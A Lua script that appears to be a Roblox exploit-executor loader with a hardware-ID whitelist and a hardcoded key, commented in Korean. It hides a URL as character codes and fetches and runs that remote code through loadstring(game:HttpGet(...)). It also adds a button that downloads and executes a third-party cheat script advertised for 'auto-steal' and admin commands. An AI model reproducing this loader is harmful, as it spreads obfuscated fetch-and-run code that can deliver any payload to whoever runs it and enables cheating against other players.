-- // Obfuscated Loader with Key + HWID System

local _c,_t,_i = string.char, table.concat, tostring

-- 🔑 고정 키
local _KEY = "100809"

-- 🖥️ 허용 HWID 목록 (여기에 추가)
local _HWID_LIST = {
    ["HWID_여기에_추가"] = true,
    ["TEST_HWID"] = true
}

-- HWID 가져오기
local function _getHWID()
    if typeof(gethwid) == "function" then
        return gethwid()
    elseif typeof(getfingerprint) == "function" then
        return getfingerprint()
    elseif typeof(identifyexecutor) == "function" then
        return identifyexecutor()
    end
    return "UNKNOWN"
end

-- 차단
local function _deny(msg)
    game.Players.LocalPlayer:Kick(msg or "Access Denied")
end

-- HWID 검사
local _hwid = _getHWID()
if not _HWID_LIST[_hwid] then
    _deny("❌ 등록되지 않은 HWID\n\nHWID:\n".._hwid)
    return
end

-- Rayfield 로드 (문자열 분리)
local Rayfield = loadstring(game:HttpGet(_t({
    _c(104),_c(116),_c(116),_c(112),_c(115),_c(58),_c(47),_c(47),
    _c(115),_c(105),_c(114),_c(105),_c(117),_c(115),_c(46),
    _c(109),_c(101),_c(110),_c(117),_c(47),_c(114),_c(97),
    _c(121),_c(102),_c(105),_c(101),_c(108),_c(100)
})))()

-- 윈도우
local W = Rayfield:CreateWindow({
    Name = "Korean Hub",
    LoadingTitle = "Security Check",
    LoadingSubtitle = "HWID + Key",
    ConfigurationSaving = {Enabled = false},
    KeySystem = true,
    KeySettings = {
        Title = "키 인증",
        Subtitle = "키를 입력하세요",
        Note = "등록된 사용자만 접근 가능",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {_KEY}
    }
})

local T = W:CreateTab("Main", 4483362458)
T:CreateSection("Scripts")

T:CreateButton({
    Name = "TG Script 실행",
    Callback = function()
        loadstring(game:HttpGet(
            "https://cdn.robloxscripts.gg/public/furky/furky-*no-key*-steal-a-brainrot-script-or-infinite-brainrots-or-admin-commands-or-auto-steal-source.lua"
        ))()
    end
})

Rayfield:LoadConfiguration()
